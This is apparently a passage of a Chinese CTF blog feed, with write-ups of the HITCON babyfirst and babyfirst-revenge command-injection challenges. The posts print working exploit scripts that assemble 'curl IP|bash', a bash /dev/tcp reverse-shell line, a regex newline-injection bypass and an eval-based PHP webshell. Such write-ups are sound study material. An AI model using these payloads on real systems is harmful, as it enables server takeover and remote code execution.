class="keyword">in</span> range(<span class="number">0xB18E</span>):</span><br><span class="line">        passwd = generate_passwd(key.decode(<span class="string">"hex"</span>),result)</span><br><span class="line">        r = decrypt(output.decode(<span class="string">"base64"</span>), passwd)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">print</span> r</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;To be patient…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;赶紧趁着电脑的屏幕修好了，刚好安恒的web题目有复现，赶紧做。。。。。又从这几个题目里面学习到新知识了
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="Crypto" scheme="0verwatch.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon2017 babyfirst-revenge v2复现</title>
    <link href="0verwatch.top/hitcon2017-babyfirstv2.html"/>
    <id>0verwatch.top/hitcon2017-babyfirstv2.html</id>
    <published>2018-09-18T14:36:10.000Z</published>
    <updated>2018-09-18T14:39:35.907Z</updated>
    
    <content type="html"><![CDATA[<p>这个题目的条件更加苛刻了，先放个源码<a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p><p>简单看一下这段代码比上一次的代码的cmd长度更小，很显然我们就不能再以<code>ls&gt;&gt;_</code> 来将相关的命令覆盖到文件里面了<br>但是orange大大用的方法真是叹为观止，根据官方payload一步步来分析这里是怎么巧妙的绕过4个字符串的长度的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">payload = [ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line"> <span class="string">'&gt;dir'</span>, </span><br><span class="line"><span class="string">'&gt;sl'</span>,</span><br><span class="line"> <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line"> <span class="string">'&gt;ht-'</span>,</span><br><span class="line"> <span class="string">'*&gt;v'</span>,</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g"</span></span><br><span class="line"> <span class="string">'&gt;rev'</span>,</span><br><span class="line"> <span class="string">'*v&gt;x'</span>, </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate "curl orange.tw|python;"</span></span><br><span class="line"> <span class="comment"># generate "curl 10.188.2.20|bash" </span></span><br><span class="line"><span class="string">'&gt;\;\\'</span>,</span><br><span class="line"> <span class="string">'&gt;sh\\'</span>, </span><br><span class="line"><span class="string">'&gt;ba\\'</span>,</span><br><span class="line"> <span class="string">'&gt;\|\\'</span>,</span><br><span class="line"> <span class="string">'&gt;20\\'</span>,</span><br><span class="line"> <span class="string">'&gt;2.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;8.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;18\\'</span>,</span><br><span class="line"> <span class="string">'&gt;0.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;1\\'</span>,</span><br><span class="line"> <span class="string">'&gt;\ \\'</span>,</span><br><span class="line"> <span class="string">'&gt;rl\\'</span>,</span><br><span class="line"> <span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line"> <span class="comment"># got shell</span></span><br><span class="line"> <span class="string">'sh x'</span>, </span><br><span class="line"><span class="string">'sh g'</span>,</span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><p>首先第一个知识点就是Linux下存在<code>dir</code>命令作为<code>ls</code>命令的别名，可能有的系统没有，但是对于这道题而言是有的，而且他也是默认以字典序去排列，对于这题而言这个命令起到了拼接文件名的效果，但是注意含有特殊字符以及数字的情况下，字母排序的优先级会降低<br><img src="https://s1.ax1x.com/2018/09/18/ietTMt.png" alt="ietTMt.png"></p><p>第二个点在于单独一个<code>*</code>的命令有何作用，这个命令会先将当前目录下所有的文件进行一个排序，然后排序后的结果会以命令的形式送去<code>bash</code>执行，如下图，但是如果有写不是命令的话就会出现<code>command not found</code>的报错，这样一来我们就可一利用<code>dir</code>加上<code>*</code>命令去执行写入文件的操作，这也是这道题目关键之处，利用了逆序执行命令的骚操作，这得对Linux系统多么熟悉啊<br><img src="https://s1.ax1x.com/2018/09/18/iet7sP.png" alt="iet7sP.png"></p><p>接着上就提出下一个知识点，就是利用<code>rev</code>命令去反向文件的字符串，顾名思义，我们就是要把<code>ls -t &gt;g</code>这一条命令给逆序过来，这操作很强。这也是为什么要先构造下图中的文件名，你逆序过来就会发现是<code>ls -th &gt;g</code></p><p><img src="https://s1.ax1x.com/2018/09/18/ietHqf.png" alt="ietHqf.png"><br>有人可能会问为什么会多加一个<code>h</code>，因为如果不多加<code>h</code>的话在你执行<code>dir</code>的时候按字母排序字母<code>t</code>比<code>s</code>更靠后，放进<code>v</code>文件之后以及放入想文件里面是这样的，这就跟我们的目的相违背，不能构造出<code>ls -t &gt;g</code>了，但是我们构造的是<code>ls  -th &gt;g</code>情况就会有所改观，这个<code>h</code>实际上没有影响，就是一个改变视图结构的东西，把内存大小变得更加人性化而已。<br><img src="https://s1.ax1x.com/2018/09/18/ietqZ8.png" alt="ietqZ8.png"></p><p><img src="https://s1.ax1x.com/2018/09/18/ietLdS.png" alt="ietLdS.png"></p><p>按照上面所说把<code>v</code>文件的内容弄好，下面就应该创建一个<code>rev</code>的文件，为的是利用这个命令，通过<code>*v&gt;x</code>的方式把逆序后的内容放在x文件里面，到后期可以直接sh执行，<code>*v&gt;x</code>这个命令的含义就是将所有最后一个字母都是<code>v</code>的文件排个序，然后执行，因为r在v的前面实际上的命令就是 <code>rev v&gt;x</code>，所以最后到<code>x</code>文件里面的内容就是<br><img src="https://s1.ax1x.com/2018/09/18/ietjiQ.png" alt="ietjiQ.png"></p><p>到这里就跟第一个babyfirst-revenge一样了，后续步骤就不多说了,直接上EXP获取flag2333</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.第一个利用的点是逆序字符串放入文件中在执行，如果让我来想我是绝对想不到的，学习了<br>2.第二个就是利用了<code>dir</code>命令完美滴绕过了<code>ls&gt;&gt;x</code>这个限制<br>3.Linux下<code>*</code>命令巧妙使用</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个题目的条件更加苛刻了，先放个源码
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="0verwatch.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon2015 babyfirst复现</title>
    <link href="0verwatch.top/hitcon2015-babyfirst.html"/>
    <id>0verwatch.top/hitcon2015-babyfirst.html</id>
    <published>2018-09-14T09:10:41.000Z</published>
    <updated>2018-09-14T09:25:54.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续上面的题目，直接利用上一道题目的docker环境复现一道题目<a id="more"></a>，注意这里面的docker环境可能需要自己在某些文件夹下面设置权限，自己缺点什么环境就自己下就行了，感觉这个题目的难度比较上一题低了一点，参考博客: <a href="https://blog.spoock.com/2017/09/09/Babyfirst-writeup/" target="_blank" rel="noopener">https://blog.spoock.com/2017/09/09/Babyfirst-writeup/</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先放个题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">'sandbox/'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !file_exists($dir) )</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    chdir($dir);</span><br><span class="line"></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">for</span> ( $i=<span class="number">0</span>; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">'/^\w+$/'</span>, $args[$i]) )</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    exec(<span class="string">"/bin/orange "</span> . implode(<span class="string">" "</span>, $args));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一段代码的意思就是建立一个<code>sandbox/clientip</code>文件夹 ，然后利用通过get法师获取args的参数，然后里面有一个正则匹配，只能通过的是数字以及字母不然的话就会直接die掉，最后就是利用exec这个执行函数了，而/bin/orange最终发现只是/bin/true的软链接，没有任何的作用。</p><p>这个题目关键是那个正则，那个正则在很多题目也有见到过，由于preg_match()使用的是\w来进行检查，所有的斜线、破折号和点<code>(\,-,.)</code>都无法使用。另外就是在<code>/^\w+$\</code>中的<code>$</code>当遇到一个字符串的结尾是换行符时还是可以匹配的。利用这个特性，就可以绕过前面的<code>preg_match()</code>检查，同时多出的换行符还可以在<code>exec()</code>函数中执行。</p><p>个人感觉这个题目如果<code>implode</code>里面的分割用的不是空格而是其他的类似逗号的东西这一个题目不一定可以写文件，或许其他大佬有办法可以跟我讲讲。留了空格刚好就可以写文件了</p><p>比如传参的url是这样的<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=touch&amp;args[]=0ver</code><br>这三个参数都可以经过正则匹配<br>那么执行的过程就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/orange xxx</span><br><span class="line">touch test</span><br></pre></td></tr></table></figure><p>可以成功创建文件<br><img src="https://s1.ax1x.com/2018/09/14/iEgrQg.png" alt="iEgrQg.png"><br>这样一来，就先了正则，然后既可以创建文件了，如果implode里面不用空格分割的话，后面创建文件就会变成<code>touchtest</code>，这种东西是不可以创建文件的 </p><p>然后这里就是参考了大佬们的做法利用<code>wget</code>的方式去实现，tql</p><p>这里牵涉到另外一个知识点，我们平常见到的ip地址都是点分十进制表示的，其实IP地址还可以用直接10进制，八进制等等表示都可以</p><p>然后再开一个本地环境:192.168.1.106，服务器:192.168.1.102</p><p>在本地里面创建一个页面index.php内容为<code>&lt;?php phpinfo();?&gt;</code><br><a href="https://imgchr.com/i/iEgfYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgfYV.md.png" alt="iEgfYV.md.png"></a></p><p>然后再往服务器发送相应的参数，这时候的ip地址转化就起作用了，把本地ip换一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">"%u"</span>, ip2long(<span class="string">"192.168.1.106"</span>));</span><br></pre></td></tr></table></figure><p>得到输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3232235882</span><br></pre></td></tr></table></figure></p><p>这里用的这样的输出方法是为了解决32位以及64位php版本的问题，因为由于自己的php版本是32 位的输出的是负数，所以才用这样的的解决方法，参考链接<br><a href="https://blog.csdn.net/everything1209/article/details/22418559" target="_blank" rel="noopener">https://blog.csdn.net/everything1209/article/details/22418559</a></p><p>这时候就是开始利用了<br><code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=wget&amp;args[]=3232235882</code><br>然后就直接把192.168.1.106主页的页面给下载下来，但是这个页面是解析过了的，没有任何PHP语言的痕迹，只剩下html了<br><a href="https://imgchr.com/i/iEgIlF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgIlF.md.png" alt="iEgIlF.md.png"></a></p><p>这时候又是另外一个知识点了<br>在Linux中PHP能够执行非压缩的打包的PHP文件。<br>也就是这样的过程<br>创建1.php，内容为<code>&lt;?php echo &quot;123&quot;;?&gt;</code>，通过<code>tar</code>将<code>1.php</code>打包,<code>tar cvf test 1.php</code>，PHP运行test文件，可以运行<br><a href="https://imgchr.com/i/iEgHm9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgHm9.md.png" alt="iEgHm9.md.png"></a></p><p>复现到这里，发现orange大佬真是强，到后期就是利用上面两个知识点</p><p>在原来的本地的index.html里面改成这样的代码，注意一定要在<code>index.html</code>里面写上这样的语句，不然的话就会在像上面的例子一样在<code>index.php</code>里面的语句会被解析之后下载，会毫无用处下载下来是没有php语句的，更别谈解析了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'cmd.php'</span>, <span class="string">'</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">header("Content-Type: text/plain");</span></span><br><span class="line"><span class="string"> @eval($_POST["cmd"]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">'</span>);</span><br></pre></td></tr></table></figure><p>然后开始写webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=mkdir&amp;args[]=exploit 创建exploit文件夹</span><br><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=cd&amp;args[]=exploit%0a&amp;args[]=wget&amp;args[]=3232275969   进入exploit文件夹，下载192.168.158.1的index.html文件。</span><br></pre></td></tr></table></figure><p>然后就是利用打包的方式去执行相关的PHP代码了，想直接改名字是不可能的因为命令里面含有<code>&#39;.&#39;</code>这样的字符<br>再来一句<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=php&amp;args[]=cmd</code> 执行一波这个打包未压缩的PHP文件</p><p>然后可以执行一句话木马了，打开小马页面<code>http://192.168.1.102/sandbox/192.168.1.102/cmd.php</code>，上菜刀链接成功<br><a href="https://imgchr.com/i/iE2S6e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iE2S6e.md.png" alt="iE2S6e.md.png"></a></p><p>再看一下服务器下面的目录成功创建了<code>cmd.php</code>页面<br><img src="https://s1.ax1x.com/2018/09/14/iE2Kmj.png" alt="iE2Kmj.png"></p><p>再看看出题人的官方wp发现还有其他骚操作<br>就是利用一波<code>ftp</code>方式去下载远程的一句话木马，因为自己虚拟机没有<code>busybox</code>这个东西就不搞了<br>但还是得过一遍脑紫的，利用下面的命令把远处<code>ftp</code>服务器里面的<code>webshell.php</code>给下载下来，这样做的好处就是不用再管原来那些php繁琐的解析步骤，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox ftpget -u ftp的用户名 -p ftp的密码 ftp地址 需要下载的文件名</span><br></pre></td></tr></table></figure><p>很好的思路学习了，不一定就是busybox，还有其他利用ftp的下载功能来获取webshell的。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.两个运用的知识点远程wget下载的PHP文件是经过解析的，服务器是可以通过用php执行打包的文件的，注意不是压缩的PHP文件，有点像是两个本来安全的东西放在一起后就变成了不安全的东西。。。。个人感觉问题的严重性还是出现在php能够执行未压缩的打包文件上。<br>2根据上一次的复现题目，个人感觉命令执行在这两道题目的上面都利用了远程的另外一台主机，第一次是使用了curl命令去访问，而这次是通过wget或者是ftp去访问，骚操作又学习了一波<br>3.正则可以换行符继续匹配那个点就不多说了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;继续上面的题目，直接利用上一道题目的docker环境复现一道题目
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="0verwatch.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon2017 babyfirst-revenge复现</title>
    <link href="0verwatch.top/hitcon2017-babyfirst.html"/>
    <id>0verwatch.top/hitcon2017-babyfirst.html</id>
    <published>2018-09-06T09:30:36.000Z</published>
    <updated>2018-09-14T09:25:06.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯<a id="more"></a>emmm</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先从Hitcon2017 babyfirst-revenge这一个题目，总结一下还是学到很多东西的<br>复现地址 <a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p><p>这是题目回显的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这个源码的意思就是会自动创建一个<code>/www/sandbox/</code>然后在下面新建文件夹，然后可以通过<code>cmd</code>参数去执行相关系统命令，但是这个系统命令的长度是会有限制的，这题的关键在于要绕过这个长度以及如何去构造<code>getshell</code>的命令。<br>突然发现P神就是很早就有类似文章，我还是太菜，得拼命学习啊<br><a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html</a></p><h4 id="知识点一"><a href="#知识点一" class="headerlink" title="知识点一"></a>知识点一</h4><p>在Linux下面可以通过换行去执行断断续续的命令，例如<br><img src="https://s1.ax1x.com/2018/09/06/iCZyI1.png" alt="iCZyI1.png"></p><h4 id="知识点二"><a href="#知识点二" class="headerlink" title="知识点二"></a>知识点二</h4><p>在Linux下面可以通过写入一个文件，文件里面的内容是系统命令，然后可以通过<code>sh filename</code>来执行文本里面的系统命令，如果有报错的话会自动跳过<br>如<br><a href="https://imgchr.com/i/iCZgG6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCZgG6.md.png" alt="iCZgG6.md.png"></a></p><h4 id="知识点三"><a href="#知识点三" class="headerlink" title="知识点三"></a>知识点三</h4><p>我们可以通过&gt;+fileanme来实现新建一个文件，注意区别一下<code>&gt;</code>和<code>&gt;&gt;</code>这两个符号<br>小于号：命令默认从键盘获得的输入，改成从文件，或者其它打开文件以及设备输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; 是追加内容</span><br><span class="line">&gt; 是覆盖原有内容</span><br></pre></td></tr></table></figure><p>后面会有这里的详细利用</p><p>这样就可以运用这两个知识点去实现这段代码的绕过<br>思路就是通过构造一个文件然后往里面写入类似<code>curl 192.168.1.104|bash</code> 之类的语句然后执行，其实还可以利用其他python 以及PHP环境去执行代码，访问 <code>192.168.1.104/index.php</code>里面的内容<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>从而达到反弹webshell的目的</p><p>这里面注意两个点<br>第一点<code>ls</code>命令列文件的顺序，通过php执行的ls命令以及直接在linux下执行的ls命令是不一样的，因为我们一开始的输入是从php里面开始的<br>ls 的默认排序方式手册上只写了是<code>alphabetically</code>（字典序），经过测试发现ls排序方式是忽视字母大小写，数字排在字母前面，无视数字和英文字母之外的字符。<br>php执行生成的_的内容序列并非和我们在linux命令行一样，查资料 ls 排序和应该和环境变量<code>LC_COLLATE</code>有关！而php应该是c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a><br><img src="https://s1.ax1x.com/2018/09/06/iCetwd.png" alt="iCetwd.png"></p><p>所以还是按照官方wp那样通过追加方式去添加内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&gt;ls\\'</span>, </span><br><span class="line"> <span class="string">'ls&gt;_'</span>, </span><br><span class="line"> <span class="string">'&gt;\ \\'</span>, </span><br><span class="line"> <span class="string">'&gt;-t\\'</span>, </span><br><span class="line"> <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line"> <span class="string">'ls&gt;&gt;_'</span>,</span><br></pre></td></tr></table></figure><p>就是为了拼凑出<code>ls -t&gt;g</code>，这是为了后面构造<code>curl 192.168.1.104|bash</code> 做好准备，我们就可以通过时间的先后顺序把curl命令完整的拼接</p><p>第二点我们是通过构造文件名，然后通过<code>ls</code>命令将文件名写入到另外一个文件里面去然后执行，这里面要注意转义符号<code>\</code>(反斜杠)不要忘记</p><p>然后我们在自己的vps上先写好反弹webshell的话<br><a href="https://imgchr.com/i/iCeaFI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeaFI.md.png" alt="iCeaFI.md.png"></a></p><p>开始监听端口<br><img src="https://s1.ax1x.com/2018/09/06/iCeBSf.png" alt="iCeBSf.png"></p><p>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw|python`</span></span><br><span class="line">    <span class="comment"># generate `curl 10.188.2.20|bash` </span></span><br><span class="line">    <span class="string">'&gt;sh\ '</span>, </span><br><span class="line">    <span class="string">'&gt;ba\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;6\\'</span>,  </span><br><span class="line">    <span class="string">'&gt;10\\'</span>,</span><br><span class="line">    <span class="string">'&gt;1.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;8.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;16\\'</span>, </span><br><span class="line">    <span class="string">'&gt;2.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;19\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://192.168.1.104:49200//?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">'http://192.168.1.104:49200//?cmd='</span> + quote(i) )</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><p>反弹webshell成功<br>然后在<code>/home</code>目录下发现有关flag的东西，应该是在数据库里面<br>连接一下<br><img src="https://s1.ax1x.com/2018/09/06/iCeDl8.png" alt="iCeDl8.png"><br>交互性极差，每次都要exit一下才有回显，也是服气。。。但最后还是得到flag了<br><a href="https://imgchr.com/i/iCer6S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCer6S.md.png" alt="iCer6S.md.png"></a></p><h2 id="小结"><a href="#小结" class="headerlink" 